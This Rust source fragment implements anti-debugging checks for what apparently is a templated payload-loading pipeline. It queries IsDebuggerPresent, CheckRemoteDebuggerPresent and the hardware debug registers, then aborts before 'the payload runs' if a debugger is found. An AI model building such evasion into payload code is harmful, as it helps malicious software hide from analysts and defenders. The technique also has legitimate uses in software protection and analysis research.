// --- Anti-debug (technique fragment) ---

use windows::Win32::Foundation::BOOL;
use windows::Win32::System::Diagnostics::Debug::{
    CheckRemoteDebuggerPresent, GetThreadContext, IsDebuggerPresent, CONTEXT,
    CONTEXT_DEBUG_REGISTERS_AMD64,
};
use windows::Win32::System::Threading::{GetCurrentProcess, GetCurrentThread};

/// Whether a positive detection aborts the preparation.
const ABORT_ON_DETECT: bool = $ABORT_ON_DETECT$;

/// Errors produced by the anti-debug preparation.
#[derive(Debug, thiserror::Error)]
pub enum AntiDebugError {
    #[error("a debugger was detected")]
    DebuggerDetected,
}

/// `GetThreadContext` requires a 16-byte aligned `CONTEXT` on x64; the `windows`
/// binding only guarantees 8, so force it here.
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// Checks the current process for a debugger and, depending on the configured
/// action, aborts before the payload runs.
///
/// Several independent signals are combined. A check that cannot be *read*
/// (rather than a positive hit) is treated as "not detected", so an unavailable
/// check never aborts the pipeline by itself.
pub fn anti_debug() -> Result<bool, AntiDebugError> {
    let detected = debugger_present();
    if detected && ABORT_ON_DETECT {
        return Err(AntiDebugError::DebuggerDetected);
    }
    // A Preparation always continues the pipeline when it does not error; only
    // the `bouncer` gate decides to abort (see `techniques/README.md`).
    Ok(true)
}

/// Runs every check and ORs the results.
fn debugger_present() -> bool {
    api_debugger_present() || remote_debugger_present() || hardware_breakpoint_set()
}

/// Reads the PEB `BeingDebugged` flag through `IsDebuggerPresent`.
fn api_debugger_present() -> bool {
    unsafe { IsDebuggerPresent() }.as_bool()
}

/// Asks the kernel for the current process's debug port through
/// `CheckRemoteDebuggerPresent`.
fn remote_debugger_present() -> bool {
    let mut present = BOOL(0);
    match unsafe { CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut present) } {
        Ok(()) => present.as_bool(),
        Err(_) => false,
    }
}

/// Reads the hardware debug registers (DR0–DR3) of the current thread. A
/// non-zero register means a debugger set a hardware breakpoint.
fn hardware_breakpoint_set() -> bool {
    let mut context = AlignedContext(CONTEXT::default());
    context.0.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if unsafe { GetThreadContext(GetCurrentThread(), &mut context.0) }.is_err() {
        return false;
    }
    context.0.Dr0 != 0 || context.0.Dr1 != 0 || context.0.Dr2 != 0 || context.0.Dr3 != 0
}
